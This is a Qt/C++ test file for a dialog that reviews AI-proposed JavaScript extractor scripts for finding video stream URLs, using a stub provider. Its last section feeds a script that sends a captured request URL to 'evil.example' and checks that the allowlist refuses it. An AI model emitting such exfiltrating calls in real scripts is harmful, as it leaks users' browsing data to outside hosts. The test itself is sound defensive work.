// The review loop end to end, with a stub provider standing in for a model.
// What a real model returns is unmeasured; what the dialog does with a reply
// is not.
#include "extractor_dialog.h"
#include "extractor_signals.h"
#include "extractor_helpers.h"
#include "site_extractor.h"
#include "ai_provider.h"

#include <QApplication>
#include <QEventLoop>
#include <QPlainTextEdit>
#include <QPushButton>
#include <QTimer>
#include <QThread>
#include <QElapsedTimer>
#include <cstdio>

static int g_pass = 0, g_fail = 0;
static void check(bool ok, const QString &w) {
	if (ok) { ++g_pass; std::printf("  ok    %s\n", qPrintable(w)); }
	else    { ++g_fail; std::printf("  FAIL  %s\n", qPrintable(w)); }
}
static void section(const char *n) { std::printf("\n== %s ==\n", n); }
static void spin(int ms) { QEventLoop l; QTimer::singleShot(ms, &l, &QEventLoop::quit); l.exec(); }

// Answers with whatever it was told to, on the next turn of the event loop.
class stub_provider : public ai_provider {
	Q_OBJECT
public:
	QString reply;
	bool external = false;
	QString name() const override { return "Stub"; }
	bool available() const override { return true; }
	bool is_external() const override { return external; }
	void send(const QString &, const QString &user) override {
		last_payload = user;
		QTimer::singleShot(0, this, [this] { emit finished(reply); });
	}
	QString last_payload;
};

static QPushButton *button(QWidget *w, const QString &text) {
	for (QPushButton *b : w->findChildren<QPushButton *>())
		if (b->text().contains(text))
			return b;
	return nullptr;
}

int main(int argc, char **argv) {
	std::setvbuf(stdout, nullptr, _IONBF, 0);
	QApplication app(argc, argv);

	const QUrl page("https://site.example/watch/1");
	extractor_signals sig;
	// Feed it the way the interceptor would.
	auto feed = [&](const char *u, resource_kind k) {
		request_context c;
		c.url = QUrl(QString::fromUtf8(u));
		c.site_host = "site.example";
		c.request_host = c.url.host();
		c.kind = k;
		sig.on_request(c, request_decision{});
	};
	feed("https://site.example/watch/1", resource_kind::other);
	feed("https://site.example/app.js", resource_kind::script);
	feed("https://p.example/db/abc/cf-master.1774687168.txt?k=UCp", resource_kind::other);
	for (int i = 0; i < 40; ++i)
		feed(QString("https://p.example/db/abc/seg-%1.ts").arg(i, 5, 10, QChar('0'))
		         .toUtf8().constData(), resource_kind::other);

	check(sig.count_for("site.example") == 43,
	      QString("evidence collected (%1)").arg(sig.count_for("site.example")));

	section("a good proposal is accepted and stored");
	{
		extractor_store store;
		stub_provider prov;
		prov.reply = "```javascript\n"
		             "extract = function (page, requests) {\n"
		             "  for (var i = 0; i < requests.length; i++)\n"
		             "    if (requests[i].url.indexOf('cf-master') !== -1)\n"
		             "      return { url: requests[i].url, kind: 'hls',\n"
		             "               headers: { Referer: page.url } };\n"
		             "  return null;\n"
		             "};\n"
		             "```";
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.show();
		spin(200);

		QPushButton *send  = button(&dlg, "Send");
		QPushButton *apply = button(&dlg, "Use This");
		check(send && send->isEnabled(), "Send is offered when there is evidence");
		check(apply && !apply->isEnabled(), "and nothing can be accepted yet");

		send->click();
		spin(400);

		check(!prov.last_payload.isEmpty(), "the payload was sent");
		check(prov.last_payload.contains("cf-master"),
		      "and contains the request that matters");
		check(prov.last_payload.contains("more like this"),
		      "with the segment flood folded rather than sent whole");
		check(apply->isEnabled(), "a valid proposal becomes acceptable");

		apply->click();
		spin(200);
		check(store.has("site.example"), "accepting stores it for the host");
		check(store.source_for("site.example").contains("cf-master"),
		      "with the script itself");
		check(!store.source_for("site.example").startsWith("```"),
		      "and the markdown fence stripped");
	}

	section("a proposal that invents a URL cannot be accepted");
	{
		extractor_store store;
		stub_provider prov;
		prov.reply = "extract = function(){ return "
		             "{ url: 'https://elsewhere.example/x.m3u8', kind: 'hls' }; };";
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.show();
		spin(200);
		button(&dlg, "Send")->click();
		spin(400);

		QPushButton *apply = button(&dlg, "Use This");
		check(apply && !apply->isEnabled(),
		      "the accept button stays disabled");
		check(!store.has("site.example"), "and nothing is stored");
	}

	section("a stored extractor keeps being judged");
	{
		extractor_store store;
		store.set_for("site.example",
		               "extract = function(p, r){ for (var i=0;i<r.length;i++) "
		               "if (r[i].url.indexOf('cf-master')!==-1) "
		               "return { url: r[i].url, kind: 'hls' }; return null; };",
		               "");
		const extractor_verdict v = site_extractor::check(
			store.source_for("site.example"), page, sig.evidence_for("site.example"));
		check(v.usable, "it still matches this page");

		// A site that changed shape: the same script, evidence without it.
		extractor_signals other;
		request_context c;
		c.url = QUrl("https://site.example/watch/2");
		c.site_host = "site.example";
		c.kind = resource_kind::other;
		other.on_request(c, request_decision{});
		const extractor_verdict stale = site_extractor::check(
			store.source_for("site.example"), page, other.evidence_for("site.example"));
		check(!stale.usable,
		      "and stops producing a result when the site changes, rather than "
		      "producing a wrong one");
	}

	section("the transcript is what the user is shown");
	{
		// Driven through the real dialog, because this project's defects have
		// overwhelmingly been in wiring: a transcript that is correct and never
		// displayed is the exact failure mode to guard against here.
		extractor_signals sig;
		auto feed = [&](const char *u) {
			request_context c;
			c.url = QUrl(QString::fromUtf8(u));
			c.site_host = "site.example";
			c.request_host = c.url.host();
			c.kind = resource_kind::other;
			sig.on_request(c, request_decision{});
		};
		feed("https://site.example/watch/1");
		feed("https://cdn.example/v4/abc/cf-master.177.txt?k=UCp");

		auto fake = [](const QUrl &u, qint64, int) -> fetch_result {
			fetch_result r;
			r.reached = true;
			r.status = 200;
			r.content_type = "application/vnd.apple.mpegurl";
			r.body = u.toString().contains("cf-master")
				? QByteArray("#EXTM3U\nindex-f1.txt?k=UCp\n")
				: QByteArray("#EXTM3U\n#EXT-X-ENDLIST\n");
			return r;
		};

		helper_allowlist allow;
		allow.observe(sig.evidence_for("site.example"));
		helper_host host(&allow, fake, helper_budget{});

		extractor_store store;
		stub_provider prov;
		prov.reply =
			"extract = function (page, requests) {"
			"  for (var i = 0; i < requests.length; i++) {"
			"    var u = requests[i].url;"
			"    if (u.indexOf('cf-master') === -1) continue;"
			"    hydra.head(u);"
			"    var body = hydra.text(u);"
			"    hydra.log('found ' + body.length + ' bytes of playlist');"
			"    return { url: u, kind: 'hls', headers: { Referer: page.url } };"
			"  }"
			"  return null;"
			"};";

		const QUrl page("https://site.example/watch/1");
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.use_helpers(&host);
		dlg.show();
		spin(200);

		auto *transcript = dlg.findChild<QPlainTextEdit *>("transcript");
		auto *proposal   = dlg.findChild<QPlainTextEdit *>("proposal");
		check(transcript && proposal, "the panes are findable by name, not position");
		check(transcript && !transcript->isVisible(),
		      "and the transcript is hidden before anything has been done");

		button(&dlg, "Send")->click();
		spin(400);

		check(transcript && transcript->isVisible(),
		      "after a helper-tier run it is shown");
		const QString shown = transcript ? transcript->toPlainText() : QString();
		check(shown.contains("head") && shown.contains("text") &&
		          shown.contains("log"),
		      "with every call the script made");
		check(shown.contains("mpegurl"),
		      "saying what the server actually answered");
		check(shown.contains("found") && shown.contains("bytes of playlist"),
		      "and the script's own note alongside");
		check(!shown.startsWith("!"), "nothing is marked as refused here");
	}

	section("a slow script does not freeze the window");
	{
		// The property, stated as an ordering rather than a feeling: a timer on
		// this thread must fire *before* the verdict arrives. If judging ran
		// here, the timer would be stuck behind it and could only fire after.
		extractor_signals sig;
		request_context c;
		c.url = QUrl("https://cdn.example/v4/abc/cf-master.177.txt?k=UCp");
		c.site_host = "site.example";
		c.request_host = c.url.host();
		c.kind = resource_kind::other;
		sig.on_request(c, request_decision{});

		auto slow = [](const QUrl &, qint64, int) -> fetch_result {
			QThread::msleep(400);            // a CDN that takes its time
			fetch_result r;
			r.reached = true; r.status = 200;
			r.content_type = "application/vnd.apple.mpegurl";
			r.body = "#EXTM3U\n#EXT-X-ENDLIST\n";
			return r;
		};
		helper_allowlist allow;
		allow.observe(sig.evidence_for("site.example"));
		helper_host host(&allow, slow, helper_budget{});

		extractor_store store;
		stub_provider prov;
		prov.reply =
			"extract = function (page, requests) {"
			"  hydra.text(requests[0].url);"
			"  return { url: requests[0].url, kind: 'hls' };"
			"};";

		const QUrl page("https://site.example/watch/1");
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.use_helpers(&host);
		dlg.show();
		spin(150);

		auto *transcript = dlg.findChild<QPlainTextEdit *>("transcript");
		qint64 ticked = -1, judged = -1;
		QElapsedTimer clock;
		clock.start();
		QTimer::singleShot(120, [&] { ticked = clock.elapsed(); });

		button(&dlg, "Send")->click();
		while (clock.elapsed() < 6000 && judged < 0) {
			QCoreApplication::processEvents(QEventLoop::AllEvents, 10);
			if (transcript && transcript->isVisible())
				judged = clock.elapsed();
		}

		check(judged >= 400,
		      QString("the script really did block on a slow fetch (%1 ms)")
		          .arg(judged));
		check(ticked >= 0, "a timer on this thread still fired");
		check(ticked >= 0 && judged >= 0 && ticked < judged,
		      QString("and it fired while the script was running, not after "
		               "(%1 ms vs %2 ms)").arg(ticked).arg(judged));
	}

	section("a script that overreaches shows why, and is refused");
	{
		extractor_signals sig;
		request_context c;
		c.url = QUrl("https://site.example/watch/1");
		c.site_host = "site.example";
		c.request_host = c.url.host();
		c.kind = resource_kind::other;
		sig.on_request(c, request_decision{});

		auto fake = [](const QUrl &, qint64, int) -> fetch_result {
			fetch_result r;
			r.reached = true; r.status = 200;
			r.content_type = "text/plain"; r.body = "x";
			return r;
		};
		helper_allowlist allow;
		allow.observe(sig.evidence_for("site.example"));
		helper_host host(&allow, fake, helper_budget{});

		extractor_store store;
		stub_provider prov;
		prov.reply =
			"extract = function (page, requests) {"
			"  hydra.text('https://evil.example/?d=' + requests[0].url);"
			"  return { url: requests[0].url, kind: 'direct' };"
			"};";

		const QUrl page("https://site.example/watch/1");
		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
		dlg.use_helpers(&host);
		dlg.show();
		spin(200);
		button(&dlg, "Send")->click();
		spin(400);

		QPushButton *apply = button(&dlg, "Use This");
		check(apply && !apply->isEnabled(), "it cannot be accepted");

		auto *transcript = dlg.findChild<QPlainTextEdit *>("transcript");
		const QString shown = transcript ? transcript->toPlainText() : QString();
		check(transcript && transcript->isVisible(),
		      "and the transcript is shown on rejection too — this is the case "
		      "where it matters most");
		check(shown.contains("!"),
		      "with the refused call marked in the margin, not merely worded");
		check(shown.contains("evil.example"),
		      "naming the address it tried to reach");
		check(store.source_for("site.example").isEmpty(), "and nothing is stored");
	}

	std::printf("\n%d passed, %d failed\n", g_pass, g_fail);
	return g_fail == 0 ? 0 : 1;
}
#include "test_extloop.moc"
